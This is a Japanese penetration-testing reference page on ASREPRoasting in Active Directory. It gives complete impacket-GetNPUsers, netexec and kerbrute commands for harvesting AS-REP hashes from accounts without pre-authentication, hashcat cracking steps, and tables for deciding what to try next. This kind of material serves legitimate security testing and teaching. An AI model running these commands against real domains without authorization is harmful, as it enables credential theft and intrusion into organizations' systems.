# ASREPRoasting

> **スコープ**: Kerberos 事前認証（Pre-Authentication）が無効化されているアカウントへの AS-REP 取得とオフラインクラック。認証情報不要（ユーザー名 1 名で試せる）のため初期アクセス前からも実施可能。ハッシュクラックの詳細は `../../05_Tools_Reference/Hashcat.md` を参照。

## 着火条件

**ケース A（最小条件）— ユーザー名が 1 名だけ判明している**

- メタデータ解析（exiftool）・PDF 内文字列・メール文面等から特定のユーザー名が 1 名だけ判明した
- 認証情報は不要。そのユーザー 1 名に対して即試せる

**ケース B — ユーザーリストが入手できている**

- LDAP 匿名バインド・RID bruteforce・SMB 列挙等でユーザーリストを作成済み

どちらのケースも認証情報が不要なため、初期アクセス前から試せる。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `impacket-GetNPUsers`（ペネトレ用 Linux ディストリ標準搭載）/ `netexec`（`nxc`、標準搭載）/ `kerbrute`（ユーザー列挙。別途 GitHub 取得要）/ `hashcat`（標準搭載）
- 外部リソース依存: kerbrute はインターネットアクセス要。ユーザーリストは seclists（標準搭載）

## 先に確認すること

- **ユーザー名の形式が不明な場合**: まず `Firstname.Lastname` 形式を試し、`KDC_ERR_C_PRINCIPAL_UNKNOWN` が返ったら `FLastname` / `firstname` / `lastname` 等を試す
- 失敗した場合（事前認証無効アカウントなし）は潔く諦める。無理に試行を繰り返すとアカウントロックのリスクがある

**攻撃者の思考トレース:** 「ユーザー名が 1 名でもわかったら、まず ASREPRoasting を試す」。ハッシュが返ってきた場合はオフラインクラックに回し、クラック待ちの間に SMB 列挙や他の情報収集を並行して進める。

---

## 1. 単一ユーザー名での試行（ケース A）

**コマンド:**

```bash
# [Attacker] 単一ユーザー名に対して直接試す
impacket-GetNPUsers \
  '[DOMAIN]/[USERNAME]' \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `$krb5asrep$23$[USER]@[DOMAIN]:...` のハッシュが返る | 事前認証無効。オフラインクラック可能 | §4 ハッシュクラックへ |
| `UF_DONT_REQUIRE_PREAUTH` なしのエラー | そのユーザーは事前認証が有効 | 他のユーザーを試すか手法を変える |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | ユーザー名が存在しない | ユーザー名の形式を変えて再試行 |

---

## 2. ユーザーリストを使った一括確認（ケース B）

**コマンド:**

```bash
# [Attacker] ユーザーリストファイル（1行1ユーザー名）を用意してから実行
impacket-GetNPUsers \
  '[DOMAIN]/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 複数ユーザー分のハッシュが返る | 複数アカウントが事前認証無効 | 全ハッシュをまとめて §4 クラックへ |

---

## 3. 認証済みユーザーで全アカウントを確認 / ユーザーリスト作成

**コマンド（認証情報あり）:**

```bash
# [Attacker] 認証情報が手に入ったら全アカウントを一括スキャン
impacket-GetNPUsers \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt

# [Attacker] NetExec を使用
nxc ldap [DC_IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.txt
```

**コマンド（認証情報なし・Kerbrute でユーザー列挙）:**

```bash
# [Attacker] Kerbrute でユーザーの存在確認
kerbrute userenum \
  --dc [DC_IP] \
  -d [DOMAIN] \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt
```

> `kerbrute`: Kerberos プロトコルを使ってユーザーの存在確認をする（ペネトレ用 Linux ディストリ標準搭載ではない場合がある）。`KDC_ERR_PREAUTH_REQUIRED` が返れば「ユーザーは存在するが事前認証が有効」、`KDC_ERR_C_PRINCIPAL_UNKNOWN` は「ユーザーが存在しない」を意味する。

**一般的な AD ユーザー名の形式:**

```
administrator / guest
[firstname].[lastname]    ← 最多。まずこれを試す
[f][lastname]
[firstname][l]
```

---

## 4. ハッシュのクラック

**コマンド:**

```bash
# [Attacker] hashcat で AS-REP ハッシュをクラック（-m 18200）
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

> 詳細 → `../../05_Tools_Reference/Hashcat.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| パスワードがクラックされる | 認証情報取得 | 取得したパスワードで WinRM / SMB 等で接続 / 使い回し確認 |
| クラック失敗 | パスワードが強力 | 別の攻撃手法に切り替える |

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| 全ユーザーで `UF_DONT_REQUIRE_PREAUTH` なし | 事前認証無効アカウントが存在しない | Kerberoasting へ（認証情報が必要）|
| ユーザーリストが不正確で偽陰性が多い | 正確なユーザー名形式が不明 | Kerbrute でユーザー列挙してから再試行 |
| クラック失敗 | 強力なパスワード | 別の攻撃手法（Kerberoasting / LAPS / GenericAll）へ |

---

## 注意点・落とし穴

- 失敗した場合は潔く諦める。無理に試行を繰り返すとアカウントロックのリスクがある
- ユーザーリストが不正確だと偽陰性が多くなる

---

## 関連技術

- 前：`../../01_Reconnaissance/LDAP_Enumeration.md`（ユーザー列挙）
- 後：`../../05_Tools_Reference/Hashcat.md`（ハッシュのクラック）
- 関連：`Kerberoasting.md`（認証情報が必要な類似手法）
